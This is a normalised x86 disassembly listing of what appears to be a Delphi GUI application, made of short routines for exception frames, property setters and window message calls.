mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40341c
pop ebx
retn
sub_455114
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40341c
pop ebx
retn
sub_455128
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40341c
pop ebx
retn
sub_45513c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40341c
pop ebx
retn
sub_455150
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40341c
pop ebx
retn
sub_455164
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40341c
pop ebx
retn
sub_455178
retn
sub_45517c
retn
sub_455180
retn
sub_455184
retn
sub_455188
retn
sub_45518c
retn
sub_455190
retn
sub_455194
retn
sub_455198
retn
sub_45519c
retn
sub_4551a0
retn
sub_4551a4
retn
sub_455450
jmp sub_403a0c
sub_4557ec
push ebx
mov ebx eax
cmp [ ebx + 0x90 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebx + 0x90 ] eax
sub_455814
push esi
mov si 0xffef
call sub_40348c
pop esi
retn
sub_4558b5
jmp sub_403a0c
sub_4558bc
pop ebp
retn
sub_4558c0
sub [ rw-data ] 0x1
jae r-xdata
retn
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417990
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417990
sub_455a60
mov edx eax
sub edx 0xff000000
je r-xdata
mov eax 0x20000000
sub edx 0xffffff
jne r-xdata
retn
mov eax 0x1fffffff
retn
sub_455be5
jmp sub_403a0c
sub_455bec
pop ebx
pop ecx
pop ebp
retn
sub_455bf0
cmp [ eax + 0x3c ] 0x0
setne al
retn
sub_455bf8
cmp [ eax + 0x3c ] 0x0
jne r-xdata
retn
call sub_455dc8
sub_455ca5
jmp sub_403a0c
sub_455cac
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x54 ]
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
call sub_403290
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x54 ] edx
sub_455e5b
jmp sub_403a0c
sub_455e62
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_455efa
jmp sub_403a0c
sub_455f01
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455f1e
mov eax [ ebp - 0xc ]
call sub_403290
retn
sub_455f17
jmp sub_403a0c
sub_455f1e
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_40348c
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_455fd7
jmp sub_403a0c
sub_455fde
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_455fe4
or edx 0xffffffff
call sub_455f58
retn
sub_4563f3
jmp sub_403a0c
sub_4563fa
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456417
mov eax [ ebp - 0xc ]
call sub_403290
retn
sub_456410
jmp sub_403a0c
sub_456417
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456434
mov eax [ ebp - 0x4 ]
call sub_456f2c
retn
sub_45642d
jmp sub_403a0c
sub_456434
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_456638
jmp sub_403a0c
sub_45663f
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_456644
push esi
mov esi eax
cmp dl [ esi + 0x40 ]
je r-xdata
pop esi
retn
mov [ esi + 0x40 ] dl
mov eax esi
mov si 0xffef
call sub_40348c
sub_45665c
push ebx
mov ebx edx
mov ecx ebx
xor edx edx
xor eax eax
call sub_416cac
pop ebx
retn
sub_456700
mov [ edx + 0x4 ] eax
mov ecx [ eax + 0x4c ]
test ecx ecx
je r-xdata
retn
mov eax ecx
call sub_4181b4
sub_456817
jmp sub_403a0c
sub_45681e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403290
retn
sub_456834
jmp sub_403a0c
sub_456b46
jmp sub_403a0c
sub_456b4d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456b6a
mov eax [ ebp - 0x10 ]
call sub_403290
retn
sub_456b63
jmp sub_403a0c
sub_456b6a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456b87
mov eax [ ebp - 0x8 ]
call sub_403290
retn
sub_456b80
jmp sub_403a0c
sub_456b87
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_456bf0
jmp sub_403a0c
sub_456d09
jmp sub_403a0c
sub_456d26
jmp sub_403a0c
sub_456ede
jmp sub_403a0c
sub_456ee5
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_456f28
inc [ eax + 0x5c ]
retn
sub_456f2c
push esi
cmp [ eax + 0x5c ] 0x0
jle r-xdata
cmp [ eax + 0x58 ] 0x0
je r-xdata
dec [ eax + 0x5c ]
pop esi
retn
mov [ eax + 0x58 ] 0x0
mov si 0xffef
call sub_40348c
sub_456f80
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x4 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_456fbd
jmp sub_403a0c
sub_456fc4
pop ebp
retn
sub_456fc8
sub [ rw-data ] 0x1
retn
sub_457ed3
jmp [ eax + eax ]
sub_457f30
mov eax [ esp + 0x8 ]
retn
sub_457f38
push ebx
mov ebx eax
call sub_457f30
push eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b84c
jmp sub_403a44
sub_457f54
pop ebx
retn
sub_4581cd
jmp sub_403a0c
sub_4581d4
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45831f
jmp sub_403a0c
sub_458326
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45833c
push ebx
mov eax [ rw-data ]
call sub_418868
mov ebx eax
movzx edx bx
mov cl 0x1
mov eax [ rw-data ]
call sub_41883c
mov eax ebx
pop ebx
retn
sub_4584c4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403440
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_4584e0
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403440
mov al [ eax + 0x95 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0xa8 ]
sete al
pop ebx
retn
sub_458bdb
jmp sub_403a0c
sub_458be2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_458cda
jmp sub_403a0c
sub_458ce1
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_459104
jmp sub_403a0c
sub_45910b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_4595b7
jmp sub_403a0c
sub_459a58
jmp sub_403a0c
sub_459a5f
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_459ec3
jmp sub_403a0c
sub_45a380
jmp sub_403a0c
sub_45a387
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45a732
jmp sub_403a0c
sub_45a739
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_45a747
inc [ ecx ]
add [ eax ] al
add [ 0xffffffffb0000000 ] ch
add ebx eax
nop
cmp dl [ eax + 0x48 ]
je r-xdata
retn
mov [ eax + 0x48 ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_45a8f4
mov eax [ r-xdata ]
retn
sub_45a930
cmp dx [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_45a944
cmp dl [ eax + 0x3e ]
je r-xdata
retn
mov [ eax + 0x3e ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_45a954
cmp edx [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] edx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_45a964
or edx 0xffffffff
mov ecx [ eax + 0x64 ]
test ecx ecx
je r-xdata
mov eax edx
retn
mov edx eax
mov eax ecx
call sub_45ac60
mov edx eax
sub_45a9fc
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_403440
mov edx esi
call sub_45a97c
pop esi
pop ebx
retn
sub_45aa78
mov edx [ eax + 0x44 ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_45ac60
push esi
or ecx 0xffffffff
mov esi [ eax + 0x5c ]
test esi esi
je r-xdata
mov eax ecx
pop esi
retn
mov eax esi
call sub_41836c
mov ecx eax
sub_45ae50
mov edx [ eax + 0x64 ]
test edx edx
je r-xdata
mov eax edx
retn
cmp [ edx + 0x70 ] 0x0
je r-xdata
mov eax [ edx + 0x70 ]
retn
sub_45aeb8
jmp r-xdata
mov edx [ eax + 0x64 ]
test edx edx
jne r-xdata
mov eax edx
mov eax [ eax + 0x70 ]
retn
sub_45b260
cmp edx [ eax + 0x7c ]
jne r-xdata
retn
call sub_45b294
sub_45b294
mov edx sub_45b26c
mov ecx eax
mov eax [ eax + 0x68 ]
xchg edx eax
call sub_4583bc
retn
sub_45b47e
jmp sub_403a0c
sub_45b485
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45b91c
jmp sub_403a0c
sub_45b95b
jmp sub_403a0c
sub_45b962
mov al [ ebp - 0x1a ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45bb00
cmp dl [ eax + 0x3c ]
je r-xdata
retn
mov [ eax + 0x3c ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_45bc3c
push ebp
mov ebp esp
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ eax + 0x34 ]
mov si 0xfffd
call sub_40348c
pop esi
pop ebp
retn 0x8
sub_45bc58
mov eax [ eax + 0x34 ]
call sub_458e90
retn
sub_45bc64
push esi
mov esi eax
mov eax [ esi + 0x34 ]
mov si 0xfff9
call sub_40348c
pop esi
retn
sub_45bca0
push ebx
mov ecx sub_45bc78
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_4583bc
pop ebx
retn
sub_45bed4
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov al 0x1
retn
cmp [ eax + 0x48 ] 0x0
jne r-xdata
xor eax eax
retn
sub_45bee8
jmp r-xdata
test edx edx
jle r-xdata
retn
test eax eax
jne r-xdata
mov eax [ eax + 0x64 ]
dec edx
sub_45c01d
jmp sub_403758
sub_45c11f
jmp sub_403a0c
sub_45c14a
jmp sub_403a0c
sub_45c151
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov al 0x1
cmp [ ebp - 0x14 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_45c168
mov al [ eax + 0x41 ]
xor al 0x1
retn
sub_45c350
cmp dl [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] dl
call sub_45bca0
sub_45c3d0
jmp sub_403a0c
sub_45c414
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_45c42c
push ebx
mov ebx eax
mov eax ebx
call sub_420b64
xor ecx ecx
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop ebx
retn
sub_45c47e
add [ eax ] al
cmp edx [ eax + 0x48 ]
jne r-xdata
retn
call sub_45bca0
sub_45c4f4
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_45c63d
jmp sub_403a0c
sub_45c644
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_45c884
cmp dl [ eax + 0x41 ]
je r-xdata
retn
mov [ eax + 0x41 ] dl
call sub_45c894
sub_45c8e8
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3b ]
mov al [ eax + rw-data ]
retn
sub_45c8f8
and edx 0x7f
mov dl [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x3b ] dl
retn
sub_45c908
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3c ]
mov al [ eax + rw-data ]
retn
sub_45c918
and edx 0x7f
mov dl [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x3c ] dl
retn
sub_45c928
cmp dl [ eax + 0x5c ]
je r-xdata
retn
mov [ eax + 0x5c ] dl
mov edx [ eax + 0x38 ]
test edx edx
je r-xdata
push 0x0
push 0x0
push 0xb015
push edx
call SendMessageA
sub_45c9a0
test edx edx
je r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_458ce8
retn
mov eax [ eax + 0x34 ]
mov edx [ edx + 0x34 ]
call sub_458ce8
retn
sub_45c9bc
test edx edx
je r-xdata
retn
mov ecx [ eax + 0x34 ]
mov ecx [ ecx + 0x68 ]
cmp ecx [ edx + 0x34 ]
jne r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_458ce8
sub_45ca04
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
call sub_45bc58
retn
mov eax edx
retn
sub_45ca3e
jmp sub_403758
sub_45ca43
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_468614
call sub_403ac0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45cda9
jmp sub_403a0c
sub_45cdb0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_403290
retn
sub_45cdc6
jmp sub_403a0c
sub_45cec7
jmp sub_403a0c
sub_45cece
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ceeb
mov eax [ ebp - 0x14 ]
call sub_403290
retn
sub_45cee4
jmp sub_403a0c
sub_45cf09
jmp sub_403a0c
sub_45cf93
jmp sub_403a0c
sub_45cf9a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45cfcc
push ebx
mov ebx eax
mov eax ebx
call sub_4184ac
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x10 ]
call sub_421914
sub_45d090
push ebx
cmp [ eax + 0x72 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x74 ]
call [ ebx + 0x70 ]
sub_45d0a4
mov eax [ eax + 0x34 ]
mov eax [ eax + 0x54 ]
retn
sub_45d0ac
mov eax [ eax + 0x34 ]
mov [ eax + 0x54 ] edx
retn
sub_45d471
jmp sub_403a0c
sub_45d478
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45d578
jmp sub_403a0c
sub_45d57f
pop ebp
retn
sub_45e0f7
[ edi + edi * 8 - 0x2f002f ]
sub_45e0fe
stc
jmp esp
sub_45f221
inc ebp
add [ eax - 0x2c000000 ] ah
imul eax [ ecx ] sub_420e84
int3
sub_45f3c0
mov eax [ rw-data ]
retn
sub_45f3c8
mov [ rw-data ] eax
retn
sub_45f510
jmp sub_403758
sub_45f547
jmp sub_403a0c
sub_45f54e
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45f71c
call sub_42183c
retn
sub_45f85e
jmp sub_403a0c
sub_45f865
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45f909
jmp sub_403a0c
sub_45f910
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45f9a0
mov al [ eax + 0x1f ]
xor al 0x1
retn
sub_4600cc
cmp edx [ eax + 0x28 ]
je r-xdata
retn
mov [ eax + 0x28 ] edx
mov [ eax + 0x2c ] 0x0
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_460778
sub_4600e8
cmp dl [ eax + 0x2c ]
je r-xdata
retn
mov [ eax + 0x2c ] dl
test dl dl
je r-xdata
mov edx 0xff000014
call sub_4600cc
sub_460208
cmp dl [ eax + 0x34 ]
je r-xdata
retn
mov [ eax + 0x34 ] dl
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_460778
sub_460220
cmp edx [ eax + 0x38 ]
je r-xdata
retn
mov [ eax + 0x38 ] edx
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_460778
sub_460238
mov ecx edx
mov [ eax + 0x10 ] ecx
test ecx ecx
jge r-xdata
mov eax [ eax + 0x4 ]
call sub_460778
retn
xor edx edx
mov [ eax + 0x10 ] edx
sub_460264
mov eax [ eax + 0x4 ]
mov al [ eax + 0x210 ]
xor al 0x1
retn
sub_460270
mov [ eax + 0x1c ] dl
mov eax [ eax + 0x4 ]
call sub_460778
retn
sub_460550
push ebx
mov ebx edx
mov edx ebx
call sub_44c168
and [ ebx + 0x24 ] 0xfffffffc
pop ebx
retn
sub_4605c0
cmp [ eax + 0x5c ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x1a8 ] 0x0
je r-xdata
mov al 0x1
retn
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
sub_4606e8
jmp sub_403a0c
sub_4606ef
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4606f8
push ebx
mov ebx eax
cmp [ ebx + 0x214 ] 0x0
jg r-xdata
pop ebx
retn
mov eax [ ebx + 0x208 ]
call sub_45fb04
mov eax [ ebx + 0x20c ]
call sub_45fb04
sub_460758
push esi
mov esi eax
mov eax [ esi + 0x208 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_460768
push esi
mov esi eax
mov eax [ esi + 0x20c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_460863
jmp sub_403a0c
sub_460870
test edx edx
je r-xdata
retn
test [ edx + 0x1c ] 0x1
jne r-xdata
test [ eax + 0x1c ] 0x1
jne r-xdata
call sub_460888
sub_460aa4
retn
sub_460b12
jmp sub_403a0c
sub_460b51
jmp sub_403a0c
sub_460b84
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_44d660
retn
mov ecx [ eax + 0x208 ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x208 ]
call sub_45fd90
retn
sub_460ba8
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_44d680
retn
mov ecx [ eax + 0x20c ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x20c ]
call sub_45fd90
retn
sub_460c9d
jmp sub_403a0c
sub_460ca4
mov eax [ ebp - 0x4 ]
call sub_44f5e0
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_45f9f8
mov eax [ ebp - 0x4 ]
call sub_460778
sub_460dd8
jmp sub_403a0c
sub_460e10
jmp sub_403a0c
sub_460e17
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460e37
lea eax [ ebp - 0x114 ]
call sub_404008
retn
sub_460e30
jmp sub_403a0c
sub_460e37
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_46113e
jmp sub_403a0c
sub_461145
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_40362c
j_sub_403758#6
jmp sub_403758
j_sub_403758#5
jmp sub_403758
sub_46121a
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_468614
call sub_403ac0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4615d2
jmp sub_403a0c
sub_4615d9
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4616b4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41c9a0
mov [ ebx + 0x270 ] eax
pop esi
pop ebx
retn
sub_4616cc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_461704
mov edx eax
mov eax esi
call sub_41eb90
pop esi
pop ebx
retn
sub_4616e8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_462aa8
mov edx eax
mov eax esi
call sub_41eb90
pop esi
pop ebx
retn
sub_461704
push ebx
mov ebx eax
mov eax ebx
call sub_462748
mov edx r-xdata
call sub_424730
pop ebx
retn
sub_461808
push ebx
mov ebx eax
mov eax ebx
call sub_461818
xor al 0x1
pop ebx
retn
sub_461818
cmp [ eax + 0x210 ] 0x0
jne r-xdata
mov al 0x1
retn
mov edx [ eax + 0x208 ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
mov eax [ eax + 0x20c ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
sub_461874
push ebx
cmp [ eax + 0x292 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x294 ]
call [ ebx + 0x290 ]
sub_461894
push ebx
cmp [ eax + 0x2b2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2b4 ]
call [ ebx + 0x2b0 ]
sub_4618b4
push ebx
cmp [ eax + 0x2ca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2cc ]
call [ ebx + 0x2c8 ]
sub_461bad
jmp sub_403a0c
sub_461bb4
pop ecx
pop ebp
retn
sub_461bb8
xor eax eax
retn
sub_461e90
jmp sub_403a0c
sub_461e97
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403290
retn
sub_461ead
jmp sub_403a0c
sub_461f97
jmp sub_403a0c
sub_461f9e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461fbb
mov eax [ ebp - 0xc ]
call sub_403290
retn
sub_461fb4
jmp sub_403a0c
sub_461fdb
jmp sub_403a0c
sub_4622c6
jmp sub_403a0c
sub_462459
jmp sub_403a0c
sub_462748
mov eax [ eax + 0x238 ]
retn
sub_462750
mov eax [ eax + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_46275c
mov al [ eax + 0x5e ]
xor al 0x1
retn
sub_462a9a
jmp sub_403a0c
sub_462aa1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_462aa8
mov eax [ eax + 0x25c ]
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
sub_462af0
cmp dl [ eax + 0x230 ]
je r-xdata
retn
mov [ eax + 0x230 ] dl
test [ eax + 0x1c ] 0x10
jne r-xdata
call sub_44c87c
sub_462b0c
cmp [ eax + 0x25c ] 0x0
setne al
retn
sub_462b48
push ebx
mov ebx eax
mov eax ebx
call sub_44e810
mov eax [ ebx + 0x238 ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ eax + 0x14 ]
mov edx [ ebx + 0x70 ]
call sub_423fb4
sub_462bcc
push ebx
mov ebx eax
mov eax ebx
call sub_44e838
mov eax [ ebx + 0x238 ]
test eax eax
je r-xdata
pop ebx
retn
mov edx [ ebx + 0x68 ]
call sub_4247d4
sub_462bec
push ebx
mov ebx eax
mov eax ebx
call sub_46280c
mov edx [ ebx + 0x248 ]
mov eax ebx
call sub_4628d4
pop ebx
retn
sub_463419
lea eax [ ebp - 0xb4 ]
call sub_404008
retn
sub_463425
jmp sub_403a0c
j_sub_463419
jmp sub_463419
sub_46342c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_463584
jmp sub_403a0c
sub_46358b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_463870
jmp sub_403a0c
sub_463877
mov eax [ rw-data ]
call sub_466128
mov bl 0x1
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46388e
add [ eax ] al
retn
sub_463aec
push ebx
cmp [ eax + 0x2ba ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2bc ]
call [ ebx + 0x2b8 ]
sub_463b0c
mov eax [ eax + 0x240 ]
call sub_428978
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
call sub_467ec8
sub_463bb3
jmp sub_403a0c
sub_463bba
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463bdd
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_4247ac
retn
sub_463bd6
jmp sub_403a0c
sub_463bdd
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_463d9c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_463b0c
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_464004
mov ecx [ eax + 0x248 ]
test ecx ecx
je r-xdata
retn
mov edx [ edx + 0x4 ]
mov eax ecx
call sub_45be0c
sub_4640ef
jmp sub_403a0c
sub_4640f6
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4640fc
cmp [ eax + 0x22f ] 0x2
jne r-xdata
cmp [ edx + 0x4 ] 0x0
setne dl
call sub_4638e4
test [ eax + 0x1c ] 0x10
je r-xdata
retn
sub_464154
call sub_464e7c
retn
sub_4645a1
jmp sub_403a0c
sub_4645a8
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_403758#4
jmp sub_403758
sub_464c40
jmp sub_403758
sub_464d39
jmp sub_403a0c
sub_464d40
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464d5d
lea eax [ ebp - 0x8 ]
call sub_404008
retn
sub_464d56
jmp sub_403a0c
sub_464d5d
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_464d64
push ebx
mov ebx eax
mov eax [ ebx + 0x240 ]
call sub_428978
test eax eax
jne r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_4617ac
sub_464d84
call sub_403290
retn
sub_464ddc
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_464e42
jmp sub_403a0c
sub_464ff0
jmp sub_403758
sub_46501c
xor edx edx
call sub_461b10
retn
sub_465024
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
call sub_461b10
mov eax ebx
call sub_448d54
pop ebx
retn
sub_4650aa
jmp sub_403a0c
sub_4650b1
pop ebx
pop ecx
pop ebp
retn
sub_4650b8
push ebx
mov ebx eax
push 0x0
push 0x0
push 0xb021
mov eax ebx
call sub_44f2dc
push eax
call PostMessageA
pop ebx
retn
sub_4652bc
jmp sub_403a0c
sub_46535d
jmp sub_403a0c
sub_465367
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465386
mov eax [ rw-data ]
call sub_4675a0
retn
sub_46537f
jmp sub_403a0c
sub_465386
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4653a3
lea eax [ ebp - 0x20 ]
call sub_404008
retn
sub_46539c
jmp sub_403a0c
sub_4653a3
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_465484
cmp [ eax + 0x30 ] 0x0
jne r-xdata
call sub_447f00
retn
mov edx eax
mov eax [ rw-data ]
call sub_466bf4
retn
sub_465808
mov edx eax
mov eax [ rw-data ]
call sub_468614
mov al 0x1
retn
sub_4658f0
cmp dl [ eax + 0x2e0 ]
je r-xdata
retn
mov [ eax + 0x2e0 ] dl
call sub_465818
sub_465904
cmp dl [ eax + 0x2e1 ]
je r-xdata
retn
mov [ eax + 0x2e1 ] dl
call sub_465818
sub_465918
cmp edx [ eax + 0x2ec ]
je r-xdata
retn
mov [ eax + 0x2ec ] edx
call sub_465818
sub_46592c
cmp dl [ eax + 0x2e8 ]
je r-xdata
retn
mov [ eax + 0x2e8 ] dl
call sub_465818
sub_465940
test [ eax + 0x1c ] 0x10
jne r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ eax + 0x2e0 ] 0x0
jne r-xdata
or [ edx + 0x8 ] 0x80000
cmp [ eax + 0x2e8 ] 0x0
je r-xdata
sub_465aab
jmp sub_403a0c
sub_465ab2
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_465ab8
push ebx
mov ebx eax
mov eax ebx
call sub_44dbf4
mov eax ebx
call sub_44dd78
test eax eax
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_4650b8
sub_465d2e
jmp sub_403a0c
sub_465d35
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_465d3c
push ebx
mov ebx edx
mov edx ebx
call sub_44e05c
mov eax [ ebx + 0x8 ]
xor edx edx
call sub_448008
pop ebx
retn
sub_465d90
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_465df8
mov eax [ esp ]
add esp 0x10
